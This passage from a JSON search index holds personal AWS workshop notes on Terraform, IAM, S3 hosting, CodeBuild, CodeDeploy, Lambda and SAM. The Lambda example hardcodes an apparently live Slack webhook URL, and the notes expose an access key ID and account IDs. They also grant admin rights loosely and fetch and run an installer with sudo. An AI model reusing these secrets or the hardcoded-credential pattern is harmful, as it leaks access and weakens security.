\u0026#34;${var.env_prefix}-route-table\u0026#34; } } # Associate subnet with Route Table resource \u0026#34;aws_route_table_association\u0026#34; \u0026#34;a-rtb-subnet\u0026#34; { subnet_id = aws_subnet.myapp-subnet-1.id route_table_id = aws_route_table.myapp-route-table.id } output \u0026#34;server-ip\u0026#34; { value = aws_instance.myapp-server.public_ip } resource \u0026#34;aws_instance\u0026#34; \u0026#34;myapp-server\u0026#34; { ami = var.ami_id instance_type = var.instance_type key_name = \u0026#34;tf-cli-keypair\u0026#34; associate_public_ip_address = true subnet_id = aws_subnet.myapp-subnet-1.id vpc_security_group_ids = [aws_security_group.myapp-sg.id] availability_zone\t= var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-server\u0026#34; } } terraform.tfvars - Terraform provider\r# Network and Instance variables vpc_cidr_block = \u0026#34;10.0.0.0/16\u0026#34; subnet_1_cidr_block = \u0026#34;10.0.1.0/24\u0026#34; avail_zone = \u0026#34;ap-southeast-1b\u0026#34; env_prefix = \u0026#34;web\u0026#34; my_ip = \u0026#34;\u0026lt;myip\u0026gt;/32\u0026#34; ami_id = \u0026#34;ami-04f73ca9a4310089f\u0026#34; Installation Terraform plan:\ndocker-compose run –rm terraform plan process\rTerraform apply:\ndocker-compose run --rm terraform apply --auto-approve process\rAWS Instance checking:\nAdd Keypair permission:\nchmod 400 tf-cli-keypair.pem SSH to EC2 Instances:\nssh -i tf-cli-keypair.pem ec2-user@13.250.64.49 AWS Instance checking: "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "Infrastructure as Code (IaC) with Terraform and AWS provides scalable, consistent, and automated infrastructure management. It enables version control, cost optimization, and flexibility in defining complex configurations. With modularity and reusability, fast iteration, and vendor agnosticism, it ensures reliable and efficient cloud resource provisioning, driving business agility and innovation.\nContent EC2 S3 "
},
{
	"uri": "http://localhost:1313/aws-ws/1-intro/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Home | Sile Project\nOverview AWS provides a flexible and scalable platform that enables businesses to innovate and grow without the need to invest in and manage their own infrastructure. It\u0026rsquo;s used by organizations of all sizes across various industries for a wide range of use cases, from startups building new applications to large enterprises migrating their IT infrastructure to the cloud.\nContent Introduction Prepairation Configure Cleanup "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "AWS Global Overview AWS Global Infrastructure Benefits AWS Well-Architected Amazon S3 Amazon S3 More Feature Amazone S3 Access-Management "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.6-vpc/5.6.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "1. Amazon VPC Overview 2. Amazon VPC Concepts 3. Amazon VPC Security 4. Amazon VPC - Internet Connectivity 5. Amazon VPC Peering Connections "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.8-security/5.8.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "1. AWS Security and Complicance Overview 2. AWS Share Responsibility Model Overview AWS Customer EC2 Lambda 3. AWS IAM - Overview 4. AWS IAM - Manage Permissions 5. AWS IAM - Manage IAM Roles 6. AWS IAM Features - Access Analysis "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.2-aws/",
	"title": "AWS",
	"tags": [],
	"description": "",
	"content": "Amazon Web Services (AWS) is a comprehensive and widely used cloud computing platform provided by Amazon. It offers a vast array of services, allowing individuals and businesses to build and deploy scalable applications and services without the need to invest in physical infrastructure\nAWS CLI The AWS Command Line Interface (CLI) is a powerful tool provided by Amazon Web Services (AWS) that allows you to interact with AWS services directly from your command line or terminal It provides a convenient and scriptable way to manage your AWS resources without needing to use the AWS Management Console AWS CLI configuration overview\nAWS CLI User: tf-cli\r# Create User docker-compose run --rm aws iam create-user --user-name tf-cli # List Users docker-compose run --rm aws iam list-users # Delete User docker-compose run --rm aws iam delete-user --user-name tf-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json # List Access key or User docker-compose run --rm aws iam list-access-keys --user-name tf-cli # Delete Access key docker-compose run --rm aws iam delete-access-key --user-name tf-cli --access-key-id AKIAZI2LEZRR5T3WDM5U # Attach admin access: docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::aws:policy/AdministratorAccess # User Permission docker-compose run --rm aws iam list-attached-user-policies --user-name tf-cli # Detach Policy docker-compose run --rm aws iam detach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::aws:policy/AdministratorAccess # Create Policy custom file ec2-limited-access-policy.json # Create a Custom IAM policy: docker-compose run --rm aws iam create-policy --policy-name EC2FullAccessAPSouthEast1 --policy-document file://ec2-limited-access-policy.json # Attach Policy docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 Configuration Prepair and run docker compose file\ndocker-compose run --rm aws --version AWS Access \u0026amp; Secret Create keypair to access AWS Instances: tf-cli-keypair.pem\ndocker-compose run --rm aws ec2 create-key-pair --key-name tf-cli-keypair --query \u0026#39;KeyMaterial\u0026#39; --output text \u0026gt; tf-cli-keypair.pem Create AWS Account for Terraform use AWS CLI: tf-cli\ndocker-compose run --rm aws iam create-user --user-name tf-cli AWS Checking keypair: Create Access Key \u0026amp; export to local\ndocker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json Create policy and configure to allow access EC2 and Limit Region\nCreate a custom policy file: ec2-limited-access-policy.json { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:*\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;ec2:Region\u0026#34;: \u0026#34;ap-southeast-1\u0026#34; } } } ] } Create a IAM policy: EC2FullAccessAPSouthEast1 docker-compose run --rm aws iam create-policy --policy-name EC2FullAccessAPSouthEast1 --policy-document file://ec2-limited-access-policy.json Attach the Policy to the IAM User: (tf-cli) docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 AWS Checking User: "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.2-cloudfirst/",
	"title": "Cloud First Steps",
	"tags": [],
	"description": "",
	"content": "Business Request The island\u0026rsquo;s stabilization system is failing and needs increased reliability and availability for its computational modules.\nLearning Objectives Summarize AWS Infrastructure benefits. Describe AWS Regions and Availability Zones. Deploy Amazon EC2 instances into multiple Availability Zones. "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.2-build/",
	"title": "CodeBuild",
	"tags": [],
	"description": "",
	"content": " CodeBuild Overview Create and test your first build Developer Tools \u0026gt; CodeBuild \u0026gt; Create project Project name: DevOpsAppBuild Source: AWS CodeCommit Repository: cicd-repo Reference type: Branch: master Environment: Managed image Service role: New service role - Role name: coldebuild-DevOpsAppBuild-service-role Operating system: Amazon Linux 2 Runtime(s): Standard Image: aws/codebuild/amazonlinux2-x86_64-standard:3.0 VPC Compute Buildspec Use a buildspec file: buildspec.yaml CloudWatch: enable Build project - Start build\nCheck: Build (Codebuild) - Build history\nbuildspec.yaml\nversion: 0.2 phases: install: runtime-versions: nodejs: 10 commands: - echo \u0026#34;installing something\u0026#34; pre_build: commands: - echo \u0026#34;This is the pre build phase\u0026#34; build: commands: - echo \u0026#34;This is the build phase\u0026#34; - echo \u0026#34;Here we can run some tests\u0026#34; - grep -Fq \u0026#34;Welcome\u0026#34; index.html post_build: commands: - echo \u0026#34;This is the post build phase\u0026#34; artifacts: files: - \u0026#39;**/*\u0026#39; name: DevOpsAppArtifacts Environment variables and Parameter Ex: add command version: 0.2 phases: install: runtime-versions: nodejs: 10 commands: - printenv - echo \u0026#34;installing something\u0026#34; ... Can add in Console Parameter\nAWS Systems Manager \u0026gt; Parameters Add permission access IAM - Role : coldebuild-DevOpsAppBuild-service-role Attach policy: AmazonSSMReadOnlyAccess Rebuild to test (secure database password with SSM) Artifact and S3 S3 \u0026gt; Create bucket\nName: cicddevopsartifacts Developer Tools \u0026gt; CodeBuild \u0026gt; Build projects \u0026gt; DevOpsAppBuild \u0026gt; Edit Artifacts\nType: Amazon S3 Bucket name: cicddevopsartifacts Namespace type - optional : Build ID Artifacts packing: Zip Update Artifacts Start build : Upload_Artifacts : Successded\nS3 check: Download to local "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.2-lambda/",
	"title": "Lambda",
	"tags": [],
	"description": "",
	"content": "FCJ: Optimizing EC2 Cost with Lambda Source: https://000022.awsstudygroup.com/vi/\nPrepairation: VPC: lambda-lab Auto-generation CIDR: 10.0.0.0/16 Subnet: lambda-lab-subnet-public\u0026hellip; Enable auto-assign IPv4 Address Security Group: lambda-lab Inbound rules: SSH - ICMP - HTTP - HTTPS EC2 Instance: lambda-lab-instance Key pair: lambda-lab-key VPC: lambda-lab-vpc Subnet: lambda-lab-subnet-public SG: lambda-lab Tags: Key: environment-auto - Value: true IAM Role: dc-common-lambda-role Permision: AmazonEC2FullAccess CloudWatchFullAccess Slack: Workspace: aws-lambda-labs New channel: notification Webhook URL: COPY Link Create Lambda Function 2.1 Function stop instance:\nLambda Function name: dc-common-lambda-auto-stop Runtime: Python 3.8 Architecture: x86_64 Existing role: dc-common-lambda-role Configure \u0026gt; Environment variables: Key: environment_auto - Value: true Code : lambda_function You need to change webhook_url to receive notifications to Slack. import boto3 Deploy expand: lambda_funtion\rimport boto3 import os import json import urllib3 ec2_resource = boto3.resource(\u0026#39;ec2\u0026#39;) http = urllib3.PoolManager() webhook_url = \u0026#34;https://hooks.slack.com/services/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\u0026#34; def lambda_handler(event, context): environment_auto= os.environ.get(\u0026#39;environment_auto\u0026#39;) if not environment_auto: print(\u0026#39;Target is empty\u0026#39;) else: instances = ec2_resource.instances.filter( Filters=[{\u0026#39;Name\u0026#39;: \u0026#39;tag:environment_auto\u0026#39;, \u0026#39;Values\u0026#39;: [environment_auto]}] ) if not list(instances): response = { \u0026#34;statusCode\u0026#34;:500, \u0026#34;body\u0026#34;: \u0026#34;Target Instance is None\u0026#34; } else: action_stop = instances.stop() sent_slack(action_stop) response = { \u0026#34;statusCode\u0026#34;:200, \u0026#34;body\u0026#34;: \u0026#34;EC2 Stopping\u0026#34; } return response def sent_slack(action_stop): list_instance_id = [] if (len(action_stop)\u0026gt;0) and (\u0026#34;StoppingInstances\u0026#34; in action_stop[0]) and (len(action_stop[0][\u0026#34;StoppingInstances\u0026#34;])\u0026gt;0): for i in action_stop[0][\u0026#34;StoppingInstances\u0026#34;] : list_instance_id.append(i[\u0026#34;InstanceId\u0026#34;]) msg = \u0026#34;Stopping Instances ID:\\n %s\u0026#34; %(list_instance_id) data = {\u0026#34;text\u0026#34;:msg} r = http.request(\u0026#34;POST\u0026#34;, webhook_url, body = json.dumps(data), headers = {\u0026#34;Content-Type\u0026#34;:\u0026#34;application/json\u0026#34;}) else: print (\u0026#39;Not found Instances Stop\u0026#39;) Cloud watch - Amazone Event Brigde Rules - Create rule Name: dc-common-lambda-auto-stop Description: dc-common-lambda-auto-stop Select : Schedule Schedule pattern: A schedule that runs at a regular rate, such as every 10 minutes. rate: 9 - Hours Select target: Types: AWS service Target: Lambda Function Function: dc-common-lambda-auto-stop Create rule Check result Lamba Function: dc-common-lambda-auto-start Test - Test event action: Create new event Event name: instance-stop Save -\u0026gt; Test Slack: Notification check incomming-webhook message Instances: lambda-lab-instance Status: Stopped Learn Source:\nServerless Computing with AWS Lambda\nLearning Amazon Web Services Lambda (Is Processing)\nChallenge:\nLambda Function API Gateway Solution:\nCreate funtion: Lambda \u0026gt; Funtions\nFuntion name: challenge1 Add Trigger: API Gateway Create a new API Security: Open Code - Edit index.mjs \u0026gt; Deploy Configuration: Check API Endpoint Use Postman to POST value\nInput valuse 1, value 2 Clean up your AWS environment\nDelete all AWS resources Delete all the endpoints sam delete Workflow:\nLambda Function API Gateway AWS Account Group:\nGroup name: new-admin Permission: AdministratorAccess User:\nUser name: lambdauser Group: new-admin Download : Access key ID Secret access key AWS Lambda Severless \u0026amp; Lambda\rAWS Lambda 2 Amazon API Gateway \u0026amp; Use Case\rAWS API Gateway 2 Use Case Amazon S3\rAWS S3 2 Amazon DynamoDB \u0026amp; SQS \u0026amp; Kinesis\rDynamoDB SQS Kinesis Amazon Cloudwatch\rCloudWatch - 2.1 Lambda Function\nFuntion name: my-lambda-function Runtime: Node.js 18.x Architecture: x86_64 Lambda: my-lambda-function\nEdit Test configuration and Deploy Configure Test Event Event name: test-event Template: hello-world Run Test - test-event 2.2 Add API Gateway as a trigger to Lambda\nLambda : my-lambda-function\nAdd trigger:\nSelect a source: API Gateway API type: HTTP API Security: Open Configuration check:\n- - - Edit Code: - - - - 2.3 Test your function with Postman\nAPI Development: https://www.postman.com/\n- - 2.4 Monitor your funtion with CloudWatch metrics\nthe metrics that provides the Lambda function. 2.5 Adding CloudWatch Logs\nAdd log to code : index.mjs Test API with Postman Monitor - View CloudWatch logs Check: CloudWatch \u0026gt; Log Groups \u0026gt; /aws/lambda/my-lambda-function Login Lambda console \u0026gt; Monitor \u0026gt; Logs - - "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.2-plan/",
	"title": "Plan",
	"tags": [],
	"description": "",
	"content": "Diagram Steps "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/3.1.2-s3/",
	"title": "S3",
	"tags": [],
	"description": "",
	"content": "In this Workshop we will automate create an S3 bucket\nOverview S3 Bucket AWS User: tf-s3-cli AWS Policy: AmazoneS3FullAccess Bucket name: 090524-tfs3bucket Review Configuration We will use AWS user have AdministratorAccess to create IAM User, Access and Secret Key, Policy and Attach permission AmazoneS3FullAccess to User tf-s3-cli. After that add Access and Secret Key to .env to use Docker-compose.\nAWS : User Access , Secret Key\r# check aws version docker-compose run --rm aws --version # create aws user docker-compose run --rm aws iam create-user --user-name tf-s3-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-s3-cli \u0026gt; tf-s3-cli-access-key.json Attached Amazon S3 Full Access\r# AmazoneS3FullAccess docker-compose run --rm aws iam attach-user-policy --user-name tf-s3-cli --policy-arn arn:aws:iam::637423373411:policy/AmazoneS3FullAccess Container: Docker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app .env - aws access \u0026amp; secret key\rAWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx AWS_REGION=ap-southeast-1 Terraform\nmain.tf # Variables variable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } # Tf provider terraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 4.16\u0026#34; } } required_version = \u0026#34;\u0026gt;= 1.2.0\u0026#34; } # IAM access provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-southeast-1\u0026#34; access_key = var.access_key secret_key = var.secret_key } # S3 Bucket resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;example\u0026#34; { bucket = \u0026#34;090524-tfs3bucket\u0026#34; tags = { Name = \u0026#34;My bucket\u0026#34; Environment = \u0026#34;Dev\u0026#34; } } Installation AWS Version\ndocker-compose run --entrypoint aws aws --version Amazon S3 Permission\ndocker-compose run --entrypoint aws s3 ls Create S3 Bucket\ndocker-compose run --rm terraform init docker-compose run --rm terraform plan docker-compose run --rm terraform apply --auto-approve AWS Console review\nDestroy S3 Bucket\ndocker-compose run --rm terraform destroy --auto-approve Expand detroy S3 process\r"
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/",
	"title": "Workshop Prepairation",
	"tags": [],
	"description": "",
	"content": "Home | Container | AWS | Terraform | Git | Local\nWorkshop-101 Overview : The project focuses on automating the deployment of a server in the AWS Cloud using AWS CLI, Docker Compose, and Terraform. Terraform is used to define and provision the necessary infrastructure components, while Docker Compose is employed to manage the Docker containers for the server application. The AWS CLI is used for interacting with AWS services programmatically. By integrating these tools, the project aims to streamline the deployment process, reduce manual effort, and ensure consistency and scalability in the AWS environment. Workflow : process link AWS Workshop Practice View Project at : Cloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS\nOverview :\nThis workshop will demonstrate how to leverage infrastructure as code (IaC) and DevSecOps patterns to automate, scale, and improve the security posture of cloud infrastructure and applications. We will create a pipeline that ensures our configurations are secure and compliant from code to cloud. Workshop-102 Overview : CICD is processing \u0026hellip; Workflow : process link Contents Docker AWS Teraform Git Local "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.3-deploy/",
	"title": "CodeDeploy",
	"tags": [],
	"description": "",
	"content": "Updating \u0026hellip;.\nCodeDeploy Overview . Instance setup IAM Role:\nRole name: EC2RoleforCodeDeploy Permission: AmazonS3ReadOnlyAccess EC2 - Launch Instances\nAmazon Linux 2 AMI Type: t2.micro VPC: IAM Role: EC2RoleforCodeDeploy Key pair: virginiakeypair SSH to EC2 instance (Use PuTTy \u0026amp; Keypair)\nInstall CodeDeploy agent\nCodeDeployConfig.md\r# Installing the CodeDeploy agent on EC2 sudo yum update -y sudo yum install -y ruby wget wget https://aws-codedeploy-eu-west-1.s3.eu-west-1.amazonaws.com/latest/install chmod +x ./install sudo ./install auto sudo service codedeploy-agent status # create a bucket and enable versioning aws s3 mb s3://aws-devops-cicddemo --region us-east-1 --profile aws-devops aws s3api put-bucket-versioning --bucket aws-devops-cicddemo --versioning-configuration Status=Enabled --region us-east-1 --profile aws-devops # deploy the files into S3 aws deploy push --application-name CodeDeployDemo --s3-location s3://aws-devops-cicddemo/codedeploy-demo/app.zip --ignore-hidden-files --region us-east-1 --profile aws-devops "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.3-computing/",
	"title": "Computing Solutions",
	"tags": [],
	"description": "",
	"content": "Business Request The school server that runs the scheduling solution needs more memory. Assist with vertically scaling their Amazon EC2 instance.\nLearning Objectives Describe Amazon EC2 instance families and instance types. Describe horizontal and vertical scaling. Recognize options for connecting to Amazon EC2 instances. "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/",
	"title": "Configuration",
	"tags": [],
	"description": "",
	"content": " Infrastructure as Code (IAC): IAC is the practice of managing and provisioning computing infrastructure through machine-readable definition files, rather than physical hardware configuration or interactive configuration tools. It allows you to automate the process of setting up and managing your infrastructure.\nContinuous Integration/Continuous Deployment (CI/CD): CI/CD is a set of practices and tools that enable development teams to automate the process of integrating code changes into a shared repository (Continuous Integration) and then automatically deploying those changes to production or other environments (Continuous Deployment). This helps teams deliver code changes more frequently, reliably, and efficiently.\nFollow the content bellow :\nContent IaC CICD "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.3-practice/",
	"title": "Practice",
	"tags": [],
	"description": "",
	"content": "Concept In this practice lab, you will:\nReview a bucket policy to secure a bucket in Amazone S3 Enable static website hosting. Practice Lab The AWS Management Console is a web interface to access and manage the broad collection of services provided by Amazon Web Services (AWS).\nStep 5:\nIn the top navigation bar search box, type: s3 In the search results, under Services, click S3. Go to the next step. Amazon Simple Storage Service (Amazon S3) is an object storage service that offers industry-leading scalability, data availability, security, and performance. Customers of all sizes and industries can use Amazon S3 to store and protect any amount of data for range of use cases, such as data lakes, websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics.\nStep 6:\nOn the General purpose buckets tab, click the bucket name that starts with website-bucket-.\nThe bucket name that starts with website-bucket- contains code required for this lab. Go to the next step. A bucket is a container for objects stored in Amazon S3. Every objects is contained in a bucket. Amazon S3 offers a range of storage classes for the objects that you store. You chose a class depending on your use case scenario and performance access requirements. Amazon S3 provides storage classes for frequently accessed infrequently accessed, and archive access objects.\nStep 7\nAt the top of the page, select (highlight) and copy the bucket name, and then paste it in the text editor of your choice on your device.\nYou must use this bucket name in the later DIY section of this solution. On the Objects tab, review the objects in the bucket.\nFive files should be displayed. These files contain the contents of the static webpage. Local files can be loaded into this S3 bucket by using the Upload button. Choose the check box to select text.html.\nClick Actions to expand the dropdown menu.\nChoose Rename object.\nGo to the next step. You can choose the georaphical AWS Region where Amazon S3 stores the buckets that you create. You might choose a Region to optimize latency, minimize costs, or address regulatory requirements. Objects stored in an AWS Region never leave the Region unless you explicity transfer or replicate them to another Region. For excample, objects stored in the Euro (Ireland) Region never leave it. Howerver, Amazon S3 redundantly stores objects on multiple devices across a minimun of three Availability Zones in an AWS Region. An Availability Zone is one or more discreate data centers with redundant power, networking, and connectivity in an AWS Region\nStep 8\nFor New object name, type: error.html\nThis file contains the code for the error page, which opens whenever something goes wrong. Click Save changes.\nGo to the next step.\nUsing Amazone S3, you can upload objects up to 5 GB in size with a single PUT operation. For larger objects, upteo 5 TB in size, use the multipart upload API.\nStep 9\nIn the success alert, review the message. Click the Permissions tab. Go to the next step. By default, all Amazone S3 resources (buckets, objects, and related subresources) are private. Only the resource owner can access them. The resource owner can optionally grant access permissons to others by writing an access policy.\nStep 10\nIn the Block public access (bucket settings) section, review to ensure that Block all public access is set to Off. Turning off \u0026ldquo;Block all public access\u0026rdquo; is necessary for static web hosting through your S3 bucket. Scroll down to Bucket policy. Go to the next step. You can grant permissions to your Amazon S3 resources through bucket policies and user policies. Both options use JSON-based access policy language. An Amazon Resource Name (ARN) uniquely identifies AWS resources.\nStep 11\nIn the Bucket policy editor window, review the policy.\nThis policy allows public access to the S3 bucket. Effect says this policy will Allow access. Principal defines who has access. In this case, * represents anyone. Action defines what users can do to objects in the bucket. In this case, users can only retrieve data with GetObject. Resource specifies that this policy applies to only this bucket. Generally, to safeguard against unintentional data exposure, we recommend strict S3 bucket permissions in production. Scroll up to the top of the page.\nGo to the next step.\nTo host a static website on Amazon S3, configure your bucket for static website hosting, set permissions, and add an index document. Available options include redirects, loging, and error documents.\nStep 12\nClick the Properties tab. Go to the next step. Step 13\nScroll down to Static website hosting. Click Edit. Go to the next step. Amazon S3 supports virtual-hosted-style URLs and path-style URLs. A virual-hosted-style URL locks like: https://bucket-name.s3.Region.amazonaws.com/key. A path-style URL looks like: https://s3.Region.amazonaws.com/bucket-nam/keyname.\nStep 14\nFor Static website hosting, choose Enable. For Hosting type, choose Host a static website. For Index document, type: index.html For Error document, type: error.html Go to the next step. Step 15\nScroll down to the bottom of the page. Click Save changes. Go to the next step. Step 16\nScroll down to Static website hosting. Review to ensure that Hosting type is set to Bucket hosting. Under Bucket website endpoint, click the copy icon to copy the provided endpoint. Go to the next step. Step 17\nTo load the Beach Wave Conditions webpage, in a new browser tab (or window) address bar, paste the bucket website endpoint that you just copied, and then press Enter. Go to the next step. Finish\n"
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.3-sam/",
	"title": "SAM",
	"tags": [],
	"description": "",
	"content": "AWS Serverless Application Model Source: Learning Amazon Web Services Lambda (Is processing)\nGithub: https://github.com/LinkedInLearning/learning-amazon-web-services-lambda-4411402\nChallenge:\n- - Solution:\nCreate funtions: RollADiceWithSidesFunction Create folder: roll-dice-sides/app.mjs Start local: sam build sam local start-api Running on http://127.0.0.1:3000 curl http://localhost:3000/roll curl http://localhost:3000/roll?sides=4 curl http://localhost:3000/roll?sides=20 Deploy to the Cloud sam deploy \u0026ndash;guild (or use samconfig.toml: same deploy) - - CloudFormation check - - Source: https://github.com/LinkedInLearning/learning-amazon-web-services-lambda-4411402/tree/05_05/sam-first-project\napp.mjs\rexport const lambdaHandler = async (event) =\u0026gt; { console.log(\u0026#39;Roll dice with sides run\u0026#39;); let sides = 6; if (event.queryStringParameters \u0026amp;\u0026amp; event.queryStringParameters.sides) { sides = event.queryStringParameters.sides; } const result = rollDice(sides); const message = `The result is ${result}, you rolled a dice of ${sides} sides.`; try { return { statusCode: 200, body: JSON.stringify({ message: message, }), }; } catch (err) { console.log(err); return err; } }; function rollDice(sides) { const randomNumber = Math.floor(Math.random() * sides) + 1; return randomNumber; } templete.yaml\rAWSTemplateFormatVersion: \u0026#39;2010-09-09\u0026#39; Transform: AWS::Serverless-2016-10-31 Description: \u0026gt; sam-first-project Sample SAM Template for sam-first-project # More info about Globals: https://github.com/awslabs/serverless-application-model/blob/master/docs/globals.rst Globals: Function: Timeout: 3 Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: CodeUri: hello-world/ Handler: app.lambdaHandler Runtime: nodejs18.x Architectures: - x86_64 Events: HelloWorld: Type: Api # More info about API Event Source: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#api Properties: Path: /hello Method: get RollADiceFunction: Type: AWS::Serverless::Function Properties: CodeUri: roll-dice/ Handler: app.lambdaHandler Runtime: nodejs18.x Events: RollDiceApi: Type: Api Properties: Path: /dice Method: get RollADiceWithSidesFunction: Type: AWS::Serverless::Function Properties: CodeUri: roll-dice-sides/ Handler: app.lambdaHandler Runtime: nodejs18.x Events: RollDiceSideApi: Type: Api Properties: Method: get Path: /roll Outputs: # ServerlessRestApi is an implicit API created out of Events key under Serverless::Function # Find out more about other implicit resources you can reference within SAM # https://github.com/awslabs/serverless-application-model/blob/master/docs/internals/generated_resources.rst#api HelloWorldApi: Description: \u0026#39;API Gateway endpoint URL for Prod stage for Hello World function\u0026#39; Value: !Sub \u0026#39;https://${ServerlessRestApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/hello/\u0026#39; HelloWorldFunction: Description: \u0026#39;Hello World Lambda Function ARN\u0026#39; Value: !GetAtt HelloWorldFunction.Arn HelloWorldFunctionIamRole: Description: \u0026#39;Implicit IAM Role created for Hello World function\u0026#39; Value: !GetAtt HelloWorldFunctionRole.Arn Overview IAC\rCloudWatch - Install and configure AWS SAM Install AWS CLI\naws \u0026ndash;version sam \u0026ndash;version Create an AWS SAM Project\nsam init Configure\rMACOS sam-first-project 1 - AWS Quick Start Templates 1 - Hello World Example 11 - nodejs18.x 1 - Zip 2 - Hello World Example TypeScript No - X-RAY No - CloudWatch Project name: sam-first-project ls : sam-first-project\ncd sam-first-project\ncode .\nLambda functions with AWS SAM sam-first-project sam build -\u0026gt; .aws-sam sam local invoke HelloWorldFunction \u0026ndash;event events/event.json change name and rebuild to check sam local start-api Testing Expand\rAWS SAM - Funtion and API gateway with SAM Create funtions: RollADiceFuntion Create folder : roll-dice create file /roll-dice/app.mjs Build template: sam build Run funtions: sam local invoke RollADiceFuntion \u0026ndash;event events/event.json Expand\rFuntions - Deploy your AWS SAM project to the cloud sam build\nsam deploy \u0026ndash;guided\nCloudFormation check\nCheck template.yaml output\nCheck API\nTest with Postman\nSee funtion metric and logs : sam logs \u0026ndash;name:RollADiceFunction \u0026ndash;stack-name same-first-project \u0026ndash;region eu-west-1 \u0026ndash;tail\nCheck samconfig.toml\nExcute Postman test\nCheck Sam logs again\nExpand\rBuild Deploy - "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.3-terraform/",
	"title": "Terraform",
	"tags": [],
	"description": "",
	"content": "Terraform is a open-source tool used to build, modify, and version control infratrucrure\nOverview Provider(provider.tf): Enables Terrafrom to interact with cloud providers and other APIs Terraform (versions.tf): Sets version constaints for Terraform and optionally maps provides to a source address and version constaint Variables (variable.tf): Input variables define reusable values and work like function arguments in general-purpose programming languages Resource (main.tf): Resource blocks describe infrastructure objects like VPCs, subnets, route tables, and gateways Data : Data sources allow Terraform to ultilize information form resources that were defined outside of Terraform (or defined a different Terraform configuration) Output: Outputs return structured data form your configuration and work like return values in generaral-purpose programming languages Terraform.tfvars: To set lots of variables, it is more convenient to specify their values in a variable definitions file Command terraform init [options]: command initializes a working directory containing Terraform configuration files. terraform plan [options]: command creates an execution plan, which lets you preview the changes that Terraform plans to make to your infrastructure. terraform apply [options] [plan file]: command executes the actions proposed in a Terraform plan terraform destroy [options]: command is a convenient way to destroy all remote objects managed by a particular Terraform configuration. Run Terraform in containter: Run docker compose:\ndocker-compose run --rm terraform version Run configure:\nProvider (AWS): versions.tf\nterraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 4.16\u0026#34; } } required_version = \u0026#34;\u0026gt;= 1.2.0\u0026#34; } Security credential variables: variables.tf\nvariable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } variable \u0026#34;region\u0026#34; { type = string default = \u0026#34;ap-southeast-1\u0026#34; } Terraform init:\ndocker-compose run --rm terraform init "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.4-ceconomics/",
	"title": "Cloud Economics",
	"tags": [],
	"description": "",
	"content": "Business Request The city\u0026rsquo;s surf board shop needs a cost estimation of an architecture with variable resource usage.\nLearning Objectives Describe how pricing estimates are obtained. Use the AWS Pricing Calculator to estimate the price of an AWS architecture. "
},
{
